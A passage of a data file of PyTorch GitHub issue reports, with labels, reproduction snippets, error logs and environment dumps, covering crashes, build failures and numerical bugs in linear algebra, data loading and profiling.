torch.unique_consecutive() time: 0.011050701141357422

## System Info
Collecting environment information...
PyTorch version: 1.9.0+cu111
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: Could not collect
Libc version: glibc-2.27

Python version: 3.8.8 (default, Apr 13 2021, 19:58:26)  [GCC 7.3.0] (64-bit runtime)
Python platform: Linux-5.4.0-1055-azure-x86_64-with-glibc2.10
Is CUDA available: False
CUDA runtime version: 11.1.74
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.5
[pip3] numpydoc==1.1.0
[pip3] torch==1.9.0+cu111
[pip3] torch-geometric==1.7.2
[pip3] torch-scatter==2.0.7
[pip3] torch-sparse==0.6.10
[pip3] torch-tb-profiler==0.2.1
[pip3] torchaudio==0.9.0
[pip3] torchvision==0.10.0+cu111
[conda] blas                      1.0                         mkl  
[conda] mkl                       2021.2.0           h06a4308_296  
[conda] mkl-service               2.3.0            py38h27cfd23_1  
[conda] mkl_fft                   1.3.0            py38h42c9631_2  
[conda] mkl_random                1.2.1            py38ha9443f7_2  
[conda] numpy                     1.19.5                   pypi_0    pypi
[conda] numpydoc                  1.1.0              pyhd3eb1b0_1  
[conda] torch                     1.9.0+cu111              pypi_0    pypi
[conda] torch-geometric           1.7.2                    pypi_0    pypi
[conda] torch-scatter             2.0.7                    pypi_0    pypi
[conda] torch-sparse              0.6.10                   pypi_0    pypi
[conda] torch-tb-profiler         0.2.1                    pypi_0    pypi
[conda] torchaudio                0.9.0                    pypi_0    pypi
[conda] torchvision               0.10.0+cu111             pypi_0    pypi


cc @VitalyFedyunin @ngimel @heitorschueroff",True
torchaudio build fails on CI for macOS + conda module: build triaged module: macos,"## üêõ Bug

Since around June 16th, torchaudio's nightly build (and regular CI jobs) started fail on macOS  + conda.

The latest one is https://app.circleci.com/pipelines/github/pytorch/audio/6763/workflows/0dc6aaf1-c5c9-4459-882a-5c9d1188f8f9

The relevant error is as follow and it appears to be related to Intel MKL. `-lmkl_intel_ilp64`


```
[98/99] : && /Applications/Xcode-12.0.1.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -Wall  -O3 -DNDEBUG -isysroot /Applications/Xcode-12.0.1.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.15.sdk -dynamiclib -Wl,-headerpad_max_install_names -undefined dynamic_lookup -o torchaudio/csrc/_torchaudio.so -install_name @rpath/_torchaudio.so torchaudio/csrc/CMakeFiles/_torchaudio.dir/pybind.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/lfilter.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/overdrive.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/autograd.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/kaldi.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/io.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects_chain.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/types.cpp.o  -Wl,-rpath,/Users/distiller/project/env/lib/python3.6/site-packages/torch/lib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_python.dylib  third_party/kaldi/libkaldi.a  ../../third_party/sox/../install/lib/libsox.a  ../../third_party/sox/../install/lib/libopencore-amrnb.a  ../../third_party/sox/../install/lib/libopencore-amrwb.a  ../../third_party/sox/../install/lib/libmad.a  ../../third_party/sox/../install/lib/libmp3lame.a  ../../third_party/sox/../install/lib/libFLAC.a  ../../third_party/sox/../install/lib/libopusfile.a  ../../third_party/sox/../install/lib/libopus.a  ../../third_party/sox/../install/lib/libvorbisenc.a  ../../third_party/sox/../install/lib/libvorbisfile.a  ../../third_party/sox/../install/lib/libvorbis.a  ../../third_party/sox/../install/lib/libogg.a  ../../env/lib/python3.6/site-packages/torch/lib/libtorch.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_cpu.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  -lmkl_intel_ilp64  -lmkl_core  -lmkl_intel_thread  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib && :
FAILED: torchaudio/csrc/_torchaudio.so 
: && /Applications/Xcode-12.0.1.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ -Wall  -O3 -DNDEBUG -isysroot /Applications/Xcode-12.0.1.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.15.sdk -dynamiclib -Wl,-headerpad_max_install_names -undefined dynamic_lookup -o torchaudio/csrc/_torchaudio.so -install_name @rpath/_torchaudio.so torchaudio/csrc/CMakeFiles/_torchaudio.dir/pybind.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/lfilter.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/overdrive.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/cpu/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_alphas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute_betas.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/compute.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/rnnt/autograd.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/kaldi.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/io.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/utils.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/effects_chain.cpp.o torchaudio/csrc/CMakeFiles/_torchaudio.dir/sox/types.cpp.o  -Wl,-rpath,/Users/distiller/project/env/lib/python3.6/site-packages/torch/lib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_python.dylib  third_party/kaldi/libkaldi.a  ../../third_party/sox/../install/lib/libsox.a  ../../third_party/sox/../install/lib/libopencore-amrnb.a  ../../third_party/sox/../install/lib/libopencore-amrwb.a  ../../third_party/sox/../install/lib/libmad.a  ../../third_party/sox/../install/lib/libmp3lame.a  ../../third_party/sox/../install/lib/libFLAC.a  ../../third_party/sox/../install/lib/libopusfile.a  ../../third_party/sox/../install/lib/libopus.a  ../../third_party/sox/../install/lib/libvorbisenc.a  ../../third_party/sox/../install/lib/libvorbisfile.a  ../../third_party/sox/../install/lib/libvorbis.a  ../../third_party/sox/../install/lib/libogg.a  ../../env/lib/python3.6/site-packages/torch/lib/libtorch.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libtorch_cpu.dylib  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib  -lmkl_intel_ilp64  -lmkl_core  -lmkl_intel_thread  ../../env/lib/python3.6/site-packages/torch/lib/libc10.dylib && :
ld: library not found for -lmkl_intel_ilp64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
```


cc @malfet @seemethere @walterddr @albanD",True
`torch.median` on empty tensor causes segfault high priority triage review module: crash triaged module: reductions,"## üêõ Bug

Calling `torch.median()` on an empty tensor causes segfault.

## To Reproduce

```python
import torch
t = torch.tensor([])
t.median()
```

## Expected behavior

Similar to other ops like `torch.mean()` or `torch.sum()` - attempting to find median of an empty tensor should cause a `RuntimeError` or otherwise produce a stack trace, rather than causing segfault.

## Environment

```shell
Collecting environment information...
PyTorch version: 1.9.0+cu102
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.2 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: Could not collect
Libc version: glibc-2.31

Python version: 3.8.5 (default, May 27 2021, 13:30:53)  [GCC 9.3.0] (64-bit runtime)
Python platform: Linux-5.8.0-53-generic-x86_64-with-glibc2.29
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: GeForce GTX TITAN X
Nvidia driver version: 460.32.03
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.0
[pip3] pytorch-lightning==1.3.8
[pip3] torch==1.9.0
[pip3] torch-tb-profiler==0.2.1
[pip3] torchmetrics==0.4.1
[pip3] torchvision==0.10.0
[conda] Could not collect
```


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @heitorschueroff",True
"no ""arugment"" triaged","I found a bug [here](https://github.com/pytorch/pytorch/blob/20085f6d2364c4acf526f4eb303b8623207f0d48/aten/src/ATen/core/adaption.cpp#L10), where it says ""arugment"" instead of ""argument"".

This severely hinders the use of PyTorch and must be fixed ASAP!! It broke our high availability production system. We already lost multiple big enterprise customers because of you! For sure there are many more people complaining about this tremendous bug. For such a pricey product I expect much better QC. This is unaccpetable!!!
/s",True
torch.linalg.eig() doesn't handle NaNs high priority module: crash triaged module: NaNs and Infs module: mkl module: linear algebra module: intel,"## üêõ Bug
This is a followup to https://github.com/pytorch/pytorch/issues/37499. As it was decided to handle NaNs in `x.eig()` for a tensor `x` there, I suppose they should also be handled for `torch.linalg.eig(x)`.

### To reproduce
```
import torch
import numpy as np
A = np.nan * torch.ones((3,3))
torch.linalg.eig(A)
```
This currently gives:
```
Intel MKL ERROR: Parameter 3 was incorrect on entry to SGEBAL.
Process finished with exit code 139 (interrupted by signal 11: SIGSEGV)
```
### Environment
 - PyTorch Version: 1.9.0+cu102
 - OS (e.g., Linux): Ubuntu 20.04
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.7.7
 - CUDA/cuDNN version: 10.2


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano",True
[Bug] linalg.eigh fails if device not set high priority triage review module: cuda triaged module: linear algebra,"## üêõ Bug

`torch.linalg.eigh` fails on the gpu if device not set beforehand (thanks @ngimel for the fix). 

## To Reproduce

```python
import torch
torch.__version__
# nightly 1.10

# fix is next line
# torch.cuda.set_device(""cuda:1"")
device = torch.device(""cuda:1"")

a = torch.randn(20, 50)
b = a @ a.t() + 1e-3 * torch.eye(20)
b = b.to(device)
torch.linalg.eigh(b)
```
results in 
```
RuntimeError: cusolver error: CUSOLVER_STATUS_INTERNAL_ERROR, when calling `cusolverDnXsyevd( handle, params, jobz, uplo, n, CUDA_R_32F, reinterpret_cast<void*>(A), lda, CUDA_R_32F, reinterpret_cast<void*>(W), CUDA_R_32F, reinterpret_cast<void*>(bufferOnDevice), workspaceInBytesOnDevice, reinterpret_cast<void*>(bufferOnHost), workspaceInBytesOnHost, info)`

```


## Expected behavior

this should work, and works when device is set.

## Environment
```
PyTorch version: 1.10.0.dev20210628
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.4 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2
Libc version: glibc-2.27

Python version: 3.8.10 (default, Jun  4 2021, 15:09:15)  [GCC 7.5.0] (64-bit runtime)
Python platform: Linux-4.15.0-99-generic-x86_64-with-glibc2.17
Is CUDA available: True
CUDA runtime version: 11.3.58
GPU models and configuration: 
GPU 0: NVIDIA TITAN RTX
GPU 1: NVIDIA TITAN RTX
GPU 2: NVIDIA TITAN RTX
GPU 3: NVIDIA TITAN RTX
GPU 4: NVIDIA TITAN RTX
GPU 5: NVIDIA TITAN RTX
GPU 6: NVIDIA TITAN RTX
GPU 7: NVIDIA TITAN RTX

Nvidia driver version: 465.19.01
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] gpytorch==1.5.0
[pip3] numpy==1.20.2
[pip3] torch==1.10.0.dev20210628
[pip3] torchaudio==0.10.0a0+abaa088
[pip3] torchvision==0.11.0.dev20210628
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               11.1.74              h6bb024c_0    nvidia
[conda] gpytorch                  1.5.0                     dev_0    <develop>
[conda] mkl                       2021.2.0           h06a4308_296  
[conda] mkl-service               2.3.0            py38h27cfd23_1  
[conda] mkl_fft                   1.3.0            py38h42c9631_2  
[conda] mkl_random                1.2.1            py38ha9443f7_2  
[conda] numpy                     1.20.2           py38h2d18471_0  
[conda] numpy-base                1.20.2           py38hfae3a4d_0  
[conda] pytorch                   1.10.0.dev20210628 py3.8_cuda11.1_cudnn8.0.5_0    pytorch-nightly
[conda] torchaudio                0.10.0.dev20210628            py38    pytorch-nightly
[conda] torchvision               0.11.0.dev20210628      py38_cu111    pytorch-nightly
```


## Additional context

seemingly breaks some gpytorch linear algebra. 


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano",True
Pytorch 1.9 Profiler generate invalid separator path inside JSON using tensorboard_trace_handler. high priority module: windows triaged oncall: profiler,"## üêõ Bug

On windows, tensorboard_trace_handler use the separador \  in the file path instead of / or \\\ breaking the json file.


## To Reproduce

Steps to reproduce the behavior:

1. Setup the Profiler. Example:
`with torch.profiler.profile(
    activities=[
        torch.profiler.ProfilerActivity.CPU,
        torch.profiler.ProfilerActivity.CUDA],
    schedule=torch.profiler.schedule(
        wait=2,
        warmup=3,
        active=6),
    on_trace_ready=torch.profiler.tensorboard_trace_handler('./result', worker_name='worker0'),
    record_shapes=True,
    profile_memory=True,
    with_stack=True
  ) as p:`

2. Use Kineto to try to profile the file `tensorboard --logdir=./result`
3. It throw the error on windows: `json.decoder.JSONDecodeError: Invalid \escape: line 12 column 64 (char 371)`


## Expected behavior

To escape the separator correctly on the json file. Ex: \\\

## Environment

```
PyTorch version: 1.9.0+cu111
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Microsoft Windows 10 Home Single Language
GCC version: Could not collect
Clang version: Could not collect
CMake version: Could not collect
Libc version: N/A

Python version: 3.9 (64-bit runtime)
Python platform: Windows-10-10.0.19041-SP0
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.3
[pip3] pytorch-lightning==1.3.5
[pip3] torch==1.9.0+cu111
[pip3] torch-tb-profiler==0.2.0
[pip3] torchaudio==0.9.0
[pip3] torchmetrics==0.3.2
[pip3] torchvision==0.10.0+cu111
[conda] Could not collect
```



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ilia-cher @gdankel @ngimel @nbcsm @guotuofeng @guyang3532 @gaoteng-git @peterjc123 @mszhanyi @skyline75489",True
Annoying warning with nn.MaxPool2d module: nn triaged module: named tensor,"Hi, thank you very much for pytorch 1.9!
I'm trying to update SpeechBrain (https://github.com/speechbrain/speechbrain) to support pytorch 1.9.
Everything seems to work, but I noticed an annoying warning when using  nn.MaxPool2d:

```
import torch
import torch.nn as nn

m = nn.MaxPool2d(3, stride=2)
m = nn.MaxPool2d((3, 2), stride=(2, 1))
input = torch.randn(20, 16, 50, 32)
output = m(input)
```

```
UserWarning: Named tensors and all their associated APIs are an experimental feature and subject to change. Please do not use them for anything important until they are released as stable. (Triggered internally at  /opt/conda/conda-bld/pytorch_1623448238472/work/c10/core/TensorImpl.h:1156.)
  return torch.max_pool2d(input, kernel_size, stride, padding, dilation, ceil_mode)
```

Note that it only appears when using nn.MaxPool2d (nn.MaxPool1d and  nn.AvgPool1d have no warning).
Any idea?



cc @zou3519 @albanD @mruberry @jbschlosser",True
Incremental build isn't supported on Windows in fact. module: dependency bug module: build module: windows triaged,"## üêõ Bug

Build Source code with ninja is officially supported. 
But due to Ninja issue https://github.com/ninja-build/ninja/issues/1976, the incremental build isn't supported on Windows.
So, it rebuilds all code in fact if we rerun ` python setup.py install ` on Windows

So far, we can use sccache to accelerate the rebuild.
With nothing changed, it still takes 7 minutes to rerun` python setup.py install ` for CPU build on SSD 
For HDD, it takes about 20 minutes

## To Reproduce

Steps to reproduce the behavior:
1. clone pytorch source code on windows
2. build it
3. rerun 'python setup.py install' to rebuild.

## Expected behavior
The edit and compile cycle on windows doesn't take so much time.
For small change in leaf node, rebuild should be finished as soon as Linux.

## Additional context
From the exception message in #59688, I think the root cause is that ninja fails to parse Visual C++ compiler option when rebuilding.



cc @malfet @seemethere @walterddr @peterjc123 @mszhanyi @skyline75489 @nbcsm",True
`NotImplementedError` is not right Exception for `DataPipe.__len__` module: dataloader triaged,"## üêõ Bug

Thanks to @pmeier, a bug of `IterDataPipe` was found. For each `IterDataPipe` class, we raise `NotImplementedError` in `__len__` in some cases such as `length` is -1 or prior `DataPipe` is not `Sized`.

When we apply `tqdm` to the `DataPipe` instance without explicit length, `len(dp)` will be called and the `NotImplementedError` will emit. So, we can never use `tqdm` for such kind of DataPipe. However,  we are actually expecting DataPipe with `NotImplementedError` as an infinite length. 

And, based on the definition of [`NotImplementedError`](https://docs.python.org/3/library/exceptions.html#NotImplementedError), it's not an appropriate Exception since this exception normally raises from base class to enforce derived class implementing this method.

And, considering the implementation of `tqdm`, we should switch `NotImplementedError` to `TypeError`.
https://github.com/tqdm/tqdm/blob/05ad200df3ccbc21c5c840d064e619ec9838f902/tqdm/std.py#L983-L990

## To Reproduce

```py
>>> import tqdm
>>> class DP(IterDataPipe):
...     def __len__(self):
...         raise NotImplementedError
... 
>>> dp = DP()
>>> pbar = tqdm.tqdm(dp)
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/Users/erjia/tools/miniconda3/envs/pt/lib/python3.8/site-packages/tqdm/std.py"", line 985, in __init__
    total = len(iterable)
  File ""<stdin>"", line 3, in __len__
NotImplementedError
```

## Expected behavior

By switching to `TypeError`, DataPipe works with `tqdm` correctly.
BTW, we should not create `__len__` at runtime since this method is attached to `class` object. When we change it, behavior of all instances will change. Any other suggestions to fix it are welcomed.

cc @SsnL @VitalyFedyunin @ejguan",True
torch.utils.data.DataLoader scans IterableDataset twice before it stops module: dataloader triaged module: data,"## üêõ Bug

`torch.utils.data.DataLoader`, when works with a customized `torch.util.data.IterableDataset`, scans the dataset **twice**, as shown in my diff D28508287.

To make it easy to reproduce the problem, Shunting Zhang simplified the above diff into paste P415580779, which reveals that `torch.utils.data.DataLoader` doesn‚Äôt stop calling next after the IterableDataset raised StopIteration exception.

## To Reproduce

Please try the following customized IterableDataset with DataLoader.

```python
class CachingIterator:  # depends on CachedIterable so cannot be nested class.
    def __init__(self, ds: CachedIterable):
        self.ds = ds
        self.pos = -1
        self.raise_num = 0

    def __next__(self) -> Any:
        if self.raise_num == 1:
            self.raise_num == 2
            raise StopIteration

        if self.ds.itrt is not None:
            i = next(self.ds.itrt, None)
            if i is not None:
                self.ds.cache.append(i)
                return i
            else:
                print(""CachingIterator stopes"")
                self.ds.itrt = None  # notify CachedIterable.__iter__ to yield cache.
                self.raise_num += 1
                raise StopIteration
        else:
            if self.pos + 1 < len(self.ds.cache):
                self.pos = self.pos + 1
                return self.ds.cache[self.pos]
            else:
                raise StopIteration
```

## Additional context

@dzhulgakov identified the bug is due to that the fetcher doesn't remember it had encountered StopIteration. For details, please see his comment at https://fb.quip.com/nvyoAJgmzBzZ#PBKACAQVfEj


cc @VitalyFedyunin @ejguan @SsnL",True
Multiple failures in test_unary_ufuncs on POWER module: tests triaged module: POWER,"## üêõ Bug

A large bunch of tests in test_unary_ufuncs fails on POWER9 after the vector intrinsic introduction in PyTorch 1.8 they look related hence pasted as a single issue.

## To Reproduce

Steps to reproduce the behavior:

1. run `test_unary_ufuncs.py` on PPC

## Expected behavior

Tests pass

## Environment

 - PyTorch Version (e.g., 1.0): 1.8.1
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): `CMAKE_BUILD_TYPE=Release BUILD_TEST=0 PYTORCH_BUILD_VERSION=1.8.1 PYTORCH_BUILD_NUMBER=1 MAX_JOBS=$(nproc) BLAS=Eigen USE_FFMPEG=1 BUILD_CUSTOM_PROTOBUF=0 USE_IBVERBS=1 USE_CUDA=0 USE_METAL=0 python setup.py install`
 - Python version: 3.8.6

## Additional context

I'll try to categorize the tests into failure types and (possible) explanations:

- test_contig_vs_every_other_angle_cpu_complex64: 256 / 513 elements failed `The greatest difference was 3.0628208592534065 (-3.096264600753784 vs. -0.033443741500377655)`: Looks like the VSX version gets bogus values here
-  test_contig_vs_every_other_angle_cpu_float32/float64, test_non_contig_angle_cpu_float32/float64, test_non_contig_expand_angle_cpu_int16/int32/int64/int8: `greatest difference was 3.1415927410125732 (0.0 vs. 3.1415927410125732)`: This is an omission: The VSX implementation does not return PI when the argument is negative: https://github.com/pytorch/pytorch/blob/afdfd2288ab839ece89e667e44777201536b2d82/aten/src/ATen/cpu/vec/vec256/vsx/vec256_double_vsx.h#L257
- test_non_contig_angle_cpu_complex128/complex64: `greatest difference was 1.5819721883714497 (0.8557325138535072 vs. 2.437704702224957)` and `greatest difference was 2.4029039442539215 (-0.4417212903499603 vs. -2.844625234603882)`: Similar to the first although the relation to (almost) pi/2 and 3/4*pi suggest some mixing of values
- test_non_contig_index_angle_cpu_complex128: `greatest difference was 0.38246162968485264 (-1.3715882372626278 vs. -1.7540498669474804)`
- test_reference_numerics_angle_cpu_complex128/complex64: Similar failures, probably the whole complex-angle stuff is bugged
- test_reference_numerics_angle_cpu_float32/float64: `greatest difference was nan (0.0 vs. nan)`, not sure here, maybe same as point 2
- test_reference_numerics_angle_cpu_int16/int32/int64/int8: Same as 2 (PI vs 0)
- test_reference_numerics_log1p_cpu_float32 (and log10, log2, log): Compares a value (88.72283935546875, 128.0, 38.53184127807617) against inf
- test_reference_numerics_logit_cpu_float32 `greatest difference was nan (-87.3365478515625 vs. nan)`
- test_sgn_cpu_complex128/complex64: `greatest difference was 0.5775589227244207 (0.8735823660790683 vs. 0.29602344335464753)` and `greatest difference was 0.38670969009399414 (-2.521059989929199 vs. -2.9077696800231934)`, it is the angle comparison that fails, so same as 1

cc @mruberry @VitalyFedyunin @walterddr",True
Output shape of `torch.linalg.norm` diverges from numpy equivalent in edge case. high priority triaged module: linear algebra module: norms and normalization,"## üêõ Bug

Output shape of `torch.linalg.norm` diverges from numpy equivalent in edge case.

## To Reproduce

```python
import torch
import numpy as np

t = torch.rand((1, 1, 0))
a = t.numpy()

t_norm = torch.linalg.norm(t, ord=2, dim=(0, 1), keepdim=False)
a_norm = np.linalg.norm(a, ord=2, axis=(0, 1), keepdims=False)

assert t_norm.shape == a_norm.shape
```

- This also fails for `ord=-2` but works for all other orders
- This works fine for `keepdim=True`
- This also works fine for other degenerate input shapes 

## Environment

```
PyTorch version: 1.9.0a0+gitc9de3e3
Is debug build: True
CUDA used to build PyTorch: Could not collect
ROCM used to build PyTorch: N/A

OS: Arch Linux (x86_64)
GCC version: (crosstool-NG 1.24.0.133_b0863d8_dirty) 9.3.0
Clang version: Could not collect
CMake version: version 3.20.2
Libc version: glibc-2.9

Python version: 3.6 (64-bit runtime)
Python platform: Linux-5.12.5-arch1-1-x86_64-with-arch
Is CUDA available: False
CUDA runtime version: 11.1.105
GPU models and configuration: GPU 0: NVIDIA GeForce GTX 1080
Nvidia driver version: 465.31
cuDNN version: Probably one of the following:
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_adv_infer.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_adv_train.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_cnn_infer.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_cnn_train.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_ops_infer.so.8.1.1
/usr/local/cudnn-8.1.1-cuda-11/lib64/libcudnn_ops_train.so.8.1.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.5
[pip3] pytest-pytorch==0.0.0
[pip3] torch==1.9.0a0+gitc9de3e3
[conda] magma-cuda111             2.5.2                         1    pytorch
[conda] mkl                       2021.2.0           h726a3e6_389    conda-forge
[conda] mkl-include               2021.2.0           h726a3e6_389    conda-forge
[conda] numpy                     1.19.5           py36h2aa4a07_1    conda-forge
[conda] pytest-pytorch            0.2.0              pyh44b312d_0    conda-forge
[conda] torch                     1.9.0a0+gitc9de3e3           dev_0    <develop>
```

## Additional context

This is tested in 

https://github.com/pytorch/pytorch/blob/6d45d7a6c331ddb856ac34a76bcd3613aa05185b/test/test_linalg.py#L1928

but the test never failed due to a bug in the underlying comparison mechanism. #59067 will disable the failing test case, but it should be reinstated as soon as this issue is fixed.


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano @VitalyFedyunin",True
torch.linalg.* might put the info tensor on CPU even for inputs on GPU high priority triaged module: linear algebra module: magma,"## üêõ Bug

For instance, MAGMA build without cuSOLVER torch.linalg.inv_ex might put the info tensor on CPU even for inputs on GPU. Opening a bug report, since there are other sections in BatchLinearAlgebra.cu where tensors are moved to CPU, which needs re-evaluation. 

## To Reproduce

Steps to reproduce the behavior:
See https://github.com/pytorch/pytorch/blob/b0833533a779d656cd6e9f6d103956ff105e7ef5/aten/src/ATen/native/cuda/BatchLinearAlgebra.cu#L1417
See discussion at: 
https://github.com/pytorch/pytorch/commit/a49406b33136a8c12503d00b1410e5596e19aede#r50939460

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->
## Error seen
was unskipping test_cond* for HIP and MAGMA, when this happened: 
=====================================================================
22:54:39 ERROR [0.065s]: test_cond_cuda_complex128 (main.TestLinalgCUDA)
22:54:39 ----------------------------------------------------------------------
22:54:39 Traceback (most recent call last):
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_utils.py"", line 1033, in wrapper
22:54:39 method(*args, **kwargs)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 297, in instantiated_test
22:54:39 raise rte
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 292, in instantiated_test
22:54:39 result = test_fn(self, *args)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 617, in dep_fn
22:54:39 return fn(slf, device, *args, **kwargs)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 617, in dep_fn
22:54:39 return fn(slf, device, *args, **kwargs)
22:54:39 File ""/opt/conda/lib/python3.6/site-packages/torch/testing/_internal/common_device_type.py"", line 617, in dep_fn
22:54:39 return fn(slf, device, *args, **kwargs)
22:54:39 File ""test_linalg.py"", line 1576, in test_cond
22:54:39 run_test_case(input, p)
22:54:39 File ""test_linalg.py"", line 1560, in run_test_case
22:54:39 result = torch.linalg.cond(input, p)
22:54:39 RuntimeError: expected self and mask to be on the same device, but got mask on cpu and self on cuda:0
22:54:39

## Expected behavior

Removing info to CPU removed the issue for this case: 
https://github.com/pytorch/pytorch/pull/58232 

There seems to be other sections of code where tensors are moved explicitly to CPU. 



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @xwang233 @Lezcano",True
sparse_csr_tensor input sanitization high priority triage review module: sparse module: crash triaged,"## üêõ Bug

If given a regular Python list the constructor segfaults. This is minor, but annoying to debug.

## To Reproduce

```
import torch

values = torch.tensor([1., 2., 3., 1., 2., 3., 4., 1., 2.])
crow_indices = [0, 3, 7, 9] # Python list instead of torch Tensor!
col_indices = torch.tensor([0, 1, 2, 0, 1, 2, 3, 0, 1])
size = (3, 4)

torch.sparse_csr_tensor(crow_indices,
                        col_indices,
                        values,
                        size)
```
## Expected behavior

TypeError that flags a wrong type was passed.

